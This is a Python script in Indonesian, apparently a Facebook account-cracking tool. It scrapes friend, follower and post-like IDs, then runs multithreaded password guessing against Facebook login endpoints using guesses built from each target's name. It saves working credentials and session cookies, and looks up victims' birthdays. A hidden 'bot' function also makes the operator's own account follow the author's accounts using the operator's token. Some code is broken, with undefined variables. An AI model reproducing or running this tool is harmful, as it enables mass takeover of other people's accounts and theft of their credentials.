#!/usr/bin/python2
# coding=utf-8
# Author : Fall Xavier
# RECODE BOLEH ASAL JANGAN UBAH AUTHOR DAN BOT FOLLOW
# YANG UBAH BOT FOLLOW JADI YATIM AMIN...

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
__merah__ = '\x1b[1;91m' # MERAH            
__hijau__ = '\x1b[1;92m' # HIJAU.              
__kuning__ = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
__mati__ = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
__tulisan__ = print
__xavier__ = exit
__melbu__ = input
__mbukak__ = open 
IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
    if n < 0 or n > 12:
        __xavier__()
    nTemp = n - 1
except ValueError:
    __xavier__()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
__tanggale__ = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass	
        
### BAGIAN LOGO ###
def __logone__():
	os.system("clear")
	__tulisan__("""%s
 ___________          _____ _____________________
 \_   _____/         /     \\______   \_   _____/
  |    __)  ______  /  \ /  \|    |  _/|    __)  
  |     \  /_____/ /    Y    \    |   \|     \   
  \___  /          \____|__  /______  /\___  /   
      \/                   \/       \/     \/      """%(__mati__))

### BAGIAN LOGIN ###
def __melbusc__():
	os.system('clear')
	try:
		__fall__ = __mbukak__('__token__.txt', 'r')
		__menune__()
	except (KeyError, IOError):
		os.system('clear')
		__logone__()
		__tulisan__(" %s[*] Author     : Fall Xavier Dominic Gremory XV."%(__mati__))
		__tulisan__(" [*] Github     : https://github.com/Fall-Xavier")
		__tulisan__(" [*] ---------------------------------------------")
		__tulisan__(" [*] Bergabung  : %s"%(tgl))
		__tulisan__(" [*] Status     : %sPremium%s"%(__hijau__,__mati__))
		__tulisan__(" [*] ---------------------------------------------")
		__tulisan__(" [*] IP         : %s"%(IP))
		__fall__ = __melbu__('\n [?] masukan token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+__fall__)
			a = json.loads(otw.text)
			zedd = __mbukak__('__token__.txt', 'w')
			zedd.write(__fall__)
			zedd.close()
			bot()
			buatfolder()
			__menune__()
		except KeyError:
			__xavier__(" %s[!] token kadaluwarsa!"%(__merah__))
 
### BOT FOLLOW DAN KOMEN ###
### YANG HAPUS BOT FOLLOW GW JADI YATIM AMIN... ###
### CUKUP TAMBAHKAN BOT FOLLOW MU SAJA KKKK..... ###
def bot():
	try:
		__fall__ = __mbukak__('__token__.txt', 'r')
	except (KeyError, IOError):
		__xavier__(" %s[!] token kadaluwarsa!"%(__merah__))
	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + __fall__)
	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + __fall__)
	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + __fall__)
	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + __fall__)
	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + __fall__)

### BAGIAN MENU ###
def __menune__():
    global __fall__
    os.system('clear')
    try:
        __fall__ = __mbukak__('__token__.txt', 'r').read()
        __urlnya__ = requests.get('https://graph.facebook.com/me/?access_token=' + __fall__)
        __rapih__ = json.loads(__urlnya__.text)
        __namane__ = __rapih__['name']
    except (KeyError, IOError,FileNotFoundError):
        os.system('clear')
        __tulisan__("\n %s[!] token kadaluwarsa!"%(__merah__))
        os.system('rm -rf __token__.txt')
        __melbusc__()
    except requests.exceptions.ConnectionError:
        __xavier__(" %s[!] anda tidak terhubung ke internet!"%(M))

    __logone__()
    __tulisan__(" %s[*] Author    : Fall Xavier Dominic Gremory XD."%(__mati__))
    __tulisan__(" [*] Github    : https://github.com/Fall-Xavier")
    __tulisan__(" [*] -------------------------------------------")
    __tulisan__(" [*] Bergabung : %s"%(tgl))
    __tulisan__(" [*] Status    : %sPremium%s"%(__hijau__,__mati__))
    __tulisan__(" [*] -------------------------------------------")
    __tulisan__(" [*] IP        : %s"%(IP))
    __tulisan__("\n [ selamat datang %s%s%s ]\n"%(__kuning__,__namane__,__mati__))
    __tulisan__(" [01]. crack dari id publik")
    __tulisan__(" [02]. crack dari id massal")
    __tulisan__(" [03]. crack dari followers")
    __tulisan__(" [04]. crack dari postingan")
    __tulisan__(" [05]. cek opsi hasil crack")
    __tulisan__(" [06]. cek akun hasil crack")
    __tulisan__(" [%s00%s]. logout (hapus token)"%(__merah__,__mati__))
    __pilihanmenu__ = __melbu__("\n [?] pilih menu : ")
    if __pilihanmenu__ == "":
    	__menune__()
    elif __pilihanmenu__ == "1":
    	publik()
    	__ngatursandi__()
    elif __pilihanmenu__ == "2":
    	massal()
    	__ngatursandi__()
    elif __pilihanmenu__ == "3":
    	followers()
    	__ngatursandi__()
    elif __pilihanmenu__ == "4":
    	postingan()
    	__ngatursandi__()
    elif __pilihanmenu__ == "5":
    	cekopsi()
    elif __pilihanmenu__ == "6":
    	cekhasil()
    elif __pilihanmenu__ == "0":
    	os.system('rm -f __token__.txt')
    	jalan(" [✓] berhasil menghapus token ")
    	__xavier__()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	__menune__() 
    
### DUMP PUBLIK ###
def publik():
	global __fall__
	try:
		__fall__ = __mbukak__("__token__.txt", "r").read()
	except IOError:
		__xavier__(" %s[!] token kadaluwarsa!"%(__merah__))
	__tulisan__(" [*] isi 'me' jika ingin crack dari daftar teman")
	__idne__ = __melbu__(" [*] masukan id atau username : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(__idne__, __fall__)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		__xavier__(" [!] akun tidak tersedia atau teman private")
	__tulisan__("\n [+] total id  : %s%s%s"%(__merah__,len(id),__mati__)) 
  
### DUMP MASSAL ###
def massal():
	global __fall__
	try:
		__fall__ = __mbukak__("__token__.txt", "r").read()
	except IOError:
		__xavier__(" %s[!] token kadaluwarsa!"%(__merah__))
	try:
		tanya_total = int(__melbu__(" [?] masukan jumlah target : "))
	except:tanya_total=1
	__tulisan__(" [*] isi 'me' jika ingin crack dari daftar teman")
	for t in range(tanya_total):
		t +=1
		__idne__ = __melbu__(" [?] id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(__idne__, __fall__)).json()["data"]:
				__idcr__ = i["id"]
				nama = i["name"]
				id.append(__idcr__+"<=>"+nama)
		except KeyError:
			__tulisan__(" [!] akun tidak tersedia atau teman private")
	__tulisan__("\n [+] total id  : %s%s%s"%(__merah__,len(id),__mati__))
	
### DUMP FOLLOWERS ###
def followers():
	global __fall__
	try:
		__fall__ = __mbukak__("__token__.txt", "r").read()
	except IOError:
		__xavier__(" %s[!] token kadaluwarsa!"%(__merah__))
	__tulisan__(" [*] isi 'me' jika ingin crack dari pengikut sendiri")
	__idne__ = __melbu__(" [*] masukan id atau username : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(__idne__, __fall__)).json()["data"]:
			__idcr__ = i["id"]
			nama = i["name"]
			id.append(__idcr__+"<=>"+nama)
	except KeyError:
		__xavier__(" [!] akun tidak tersedia atau followers private")
	__tulisan__("\n [+] total id  : %s%s%s"%(__merah__,len(id),__mati__))
	
### DUMP POSTINGAN ###
def postingan():
	global __fall__
	try:
		__fall__ = __mbukak__("__token__.txt", "r").read()
	except IOError:
		__xavier__(" %s[!] token kadaluwarsa!"%(__merah__))
	__idne__ = __melbu__(" [?] masukan url atau id postingan : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(__idne__, __fall__)).json()["data"]:
			__idcr__ = i["id"]
			nama = i["name"]
			id.append(__idcr__+"<=>"+nama)
	except KeyError:
		__xavier__(" [!] postingan tidak tersedia atau post private")
	__tulisan__("\n [+] total id  : %s%s%s"%(__merah__,len(id),__mati__))
	
### CEK HASIL CRACK ###
def cekhasil():
	__tulisan__('\n [1]. lihat hasil crack OK ')
	__tulisan__(' [2]. lihat hasil crack CP ')
	anjg = __melbu__('\n [?] pilih : ')
	if anjg == '':
		__menune__()
	elif anjg == "1":
		dirs = os.listdir("OK")
		__tulisan__("")
		for file in dirs:
			__tulisan__(" [*] "+file)
		try:
			file = __melbu__("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				__menune__()
			totalok = __mbukak__("OK/%s"%(file)).read().splitlines()
		except IOError:
			__xavier__(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		__tulisan__("\n *-------------------------------------------------*")
		__tulisan__(" [+] tanggal : %s -total : %s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		__melbu__("\n [*] tekan enter untuk kembali ke menu")
		__menune__()
	elif anjg == "2":
		dirs = os.listdir("CP")
		__tulisan__("")
		for file in dirs:
			__tulisan__(" [*] "+file)
		try:
			file = __melbu__("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				__menune__()
			totalcp = __mbukak__("CP/%s"%(file)).read().splitlines()
		except IOError:
			__xavier__(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		__tulisan__("\n *-------------------------------------------------*")
		__tulisan__(" [+] tanggal : %s -total : %s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		__melbu__("\n [*] tekan enter untuk kembali ke menu ")
		__menune__()
	else:
		__menune__()
	
####CEK OPSI HASIL CRACK####
def cekopsi():
	dirs = os.listdir("CP")
	__tulisan__("")
	for file in dirs:
		__tulisan__(" [*] CP/"+file)
	__tulisan__("\n [*] masukan file (ex: CP/%s.txt)"%(__tanggale__))
	files = __melbu__(" [?] nama file  : ")
	if files == "":
		__menune__()
	try:
		__symantec__ = __mbukak__(files, "r").readlines()
	except IOError:
		__xavier__("\n [!] nama file %s tidak tersedia"%(files))
	__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses cek\n')
	for __grc__ in __symantec__:
		__gladiator__ = __grc__.replace("\n","")
		__rvt__  = __gladiator__.split("|")
		__tulisan__("\n [+] cek : %s%s%s"%(__kuning__,__gladiator__.replace("  * --> ",""),__mati__))
		try:
			__melbucek__(__rvt__[0].replace("  * --> ",""), __rvt__[1])
		except requests.exceptions.ConnectionError:
			pass
	__tulisan__("\n [!] cek akun sudah selesai...")
	__melbu__(" [*] tekan enter untuk kembali ke menu ")
	time.sleep(1)
	__menune__()
	
def __melbucek__(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = random.choice([
		'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
		'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
	])
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		__tulisan__(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			__tulisan__("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "Lihat detail login yang ditampilkan. Ini Anda?" in str(xnxx):
			__tulisan__("\r [✓] akun lolos sesi, silahkan buka akun di browser mbasic"%(H,N))
		else:
			__tulisan__(" "+__mati__+"[+] terdapat "+str(len(ngew))+" opsi ")
			for opt in range(len(ngew)):
				__tulisan__("  ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		__tulisan__(" [!] %s"%(oh))
	else:
		__tulisan__(" [!] login gagal, silahkan cek kembali id dan kata sandi")

### BAGIAN SANDI ####
def __ngatursandi__():
	ask=__melbu__(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]:")
	if ask=="y":
		__sandimanual__()
	elif ask=="t":
		__sandiotomatis__()
	else:
		__xavier__(" %s[!] pilih jawaban dengan benar!"%(__merah__))

def __sandimanual__():
	__tulisan__("\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih")
	pwek=__melbu__('\n [?] masukan kata sandi : ')
	__tulisan__(' [*] crack dengan sandi -> [ %s%s%s ]' % (__merah__, pwek, __mati__))
	if pwek=="":
		__xavier__(" %s[!] isi jawaban dengan benar!"%(__merah__))
	elif len(pwek)<=5:
		__xavier__(" %s[!] masukan sandi minimal 6 angka!"%(__merah__))
	__tulisan__("\n [ pilih method version - silahkan coba satu² ]\n")
	__tulisan__(" [1]. method API (fast)")
	__tulisan__(" [2]. method mbasic (slow)")
	__tulisan__(" [3]. method mobile (super slow)")
	ask=__melbu__("\n [?] method : ")
	if ask=="":
		__xavier__(" %s[!] isi jawaban dengan benar!"%(__merah__))
	elif ask=="1":
		__tulisan__('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (__tanggale__))
		__tulisan__(' [+] hasil CP disimpan ke -> CP/%s.txt' % (__tanggale__))
		__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				__idcr__, __namamu__ = user.split("<=>")
				fall.submit(api, __idcr__, pwek.split(","))
		__xavier__("\n\n [#] crack selesai...")
	elif ask=="2":
		__tulisan__('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (__tanggale__))
		__tulisan__(' [+] hasil CP disimpan ke -> CP/%s.txt' % (__tanggale__))
		__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				__idcr__, __namamu__ = user.split("<=>")
				fall.submit(mfbasic, __idcr__, pwek.split(","),"https://mbasic.facebook.com")
		__xavier__("\n\n [#] crack selesai...")
	elif ask=="3":
		__tulisan__('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (__tanggale__))
		__tulisan__(' [+] hasil CP disimpan ke -> CP/%s.txt' % (__tanggale__))
		__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				__idcr__, __namamu__ = user.split("<=>")
				fall.submit(mfbasic, __idcr__, pwek.split(","),"https://m.facebook.com")
		__xavier__("\n\n [#] crack selesai...")
	
def __sandiotomatis__():
	__tulisan__("\n [ pilih method version - silahkan coba satu² ]\n")
	__tulisan__(" [1]. method API (fast)")
	__tulisan__(" [2]. method mbasic (slow)")
	__tulisan__(" [3]. method mobile (super slow)")
	ask=__melbu__("\n [?] method : ")
	if ask=="":
		__xavier__(" %s[!] isi jawaban dengan benar!"%(__merah__))
	elif ask=="1":
		__tulisan__('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (__tanggale__))
		__tulisan__(' [+] hasil CP disimpan ke -> CP/%s.txt' % (__tanggale__))
		__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				__idcr__, __namamu__ = user.split("<=>")
				nam = __namamu__.split(' ')
				if len(__namamu__) == 3 or len(__namamu__) == 4 or len(__namamu__) == 5:
					__paketpw__ = [__namamu__, nam[0]+"123", nam[0]+"12345"]
				else:
					__paketpw__ = [__namamu__, nam[0]+"123", nam[0]+"12345"]
				fall.submit(api, __idcr__, __paketpw__)
		__xavier__("\n\n [#] crack selesai...")
	elif ask=="2":
		__tulisan__('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (__tanggale__))
		__tulisan__(' [+] hasil CP disimpan ke -> CP/%s.txt' % (__tanggale__))
		__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				__idcr__, __namamu__ = user.split("<=>")
				nam = __namamu__.split(' ')
				if len(__namamu__) == 3 or len(__namamu__) == 4 or len(__namamu__) == 5:
					__paketpw__ = [__namamu__, nam[0]+"123", nam[0]+"12345"]
				else:
					__paketpw__ = [__namamu__, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, __idcr__, __paketpw__,"https://mbasic.facebook.com")
		__xavier__("\n\n [#] crack selesai...")
	elif ask=="3":
		__tulisan__('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (__tanggale__))
		__tulisan__(' [+] hasil CP disimpan ke -> CP/%s.txt' % (__tanggale__))
		__tulisan__('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				__idcr__, __namamu__ = user.split("<=>")
				nam = __namamu__.split(' ')
				if len(__namamu__) == 3 or len(__namamu__) == 4 or len(__namamu__) == 5:
					__paketpw__ = [__namamu__, nam[0]+"123", nam[0]+"12345"]
				else:
					__paketpw__ = [__namamu__, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, __idcr__, __paketpw__,"https://m.facebook.com")
		__xavier__("\n\n [#] crack selesai...")
		
### BAGIAN CRACK ###
def api(__idcr__, __paketpw__):
	global ok, cp, loop, __fall__
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(__mati__,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for __pwne__ in __paketpw__:
		__pwne__ = __pwne__.lower()
		ua = random.choice([
			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
		])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(__idcr__),
			'locale': 'en_US',
			'password': str(__pwne__),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			__tulisan__("\r  %s* --> %s|%s|%s"%(__hijau__,__idcr__, __pwne__, send.json()["access_token"]))
			ok.append("%s|%s"%(__idcr__, __pwne__))
			__mbukak__("OK/%s.txt"%(__tanggale__),"a").write("  * --> %s|%s\n"%(__idcr__, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				__fall__=__mbukak__("__token__.txt","r").read()
				__lahirmu__ = ses.get("https://graph.facebook.com/%s?access_token=%s"%(__idcr__, __fall__)).json()["birthday"]
				__wulan__, __dino__, __tahun__ = __lahirmu__.split("/")
				__wulan__ = bulan[__wulan__]
				__tulisan__("\r  %s* --> %s|%s|%s %s %s"%(__kuning__,__idcr__, __pwne__, __dino__, __wulan__, __tahun__))
				cp.append("%s|%s"%(__idcr__, __pwne__))
				__mbukak__("CP/%s.txt"%(__tanggale__),"a").write("  * --> %s|%s|%s %s %s\n"%(__idcr__, __pwne__, __dino__, __wulan__, __tahun__))
				break
			except (KeyError, IOError):
				__dino__ = (" ")
				__wulan__ = (" ")
				__tahun__ = (" ")
			except:pass
			__tulisan__("\r  %s* --> %s|%s         "%(__kuning__,__idcr__, __pwne__))
			cp.append("%s|%s"%(__idcr__, __pwne__))
			__mbukak__("CP/%s.txt"%(__tanggale__),"a").write("  * --> %s|%s\n"%(__idcr__, __pwne__))
			break
		else:
			continue

	loop += 1
	
def mfbasic(__idcr__, __paketpw__,url,**data):
	global ok, cp, loop, __fall__
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(__mati__,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for __pwne__ in __paketpw__:
		__pwne__ = __pwne__.lower()
		ua = random.choice([
			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
		])
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":__idcr__,"pass":__pwne__})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			__tulisan__("\r  %s* --> %s|%s|%s"%(__hijau__,__idcr__, __pwne__, kukis))
			ok.append("%s|%s"%(__idcr__, __pwne__))
			__mbukak__("OK/%s.txt"%(__tanggale__),"a").write("  * --> %s|%s\n"%(__idcr__, __pwne__))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				__fall__=__mbukak__("__token__.txt","r").read()
				__lahirmu__ = ses.get("https://graph.facebook.com/%s?access_token=%s"%(__idcr__, __fall__)).json()["birthday"]
				__wulan__, __dino__, __tahun__ = __lahirmu__.split("/")
				__wulan__ = bulan[__wulan__]
				__tulisan__("\r  %s* --> %s|%s|%s %s %s"%(__kuning__,__idcr__, __pwne__, __dino__, __wulan__, __tahun__))
				cp.append("%s|%s"%(__idcr__, __pwne__))
				__mbukak__("CP/%s.txt"%(__tanggale__),"a").write("  * --> %s|%s|%s %s %s\n"%(__idcr__, __pwne__, __dino__, __wulan__, __tahun__))
				break
			except (KeyError, IOError):
				__dino__ = (" ")
				__wulan__ = (" ")
				__tahun__ = (" ")
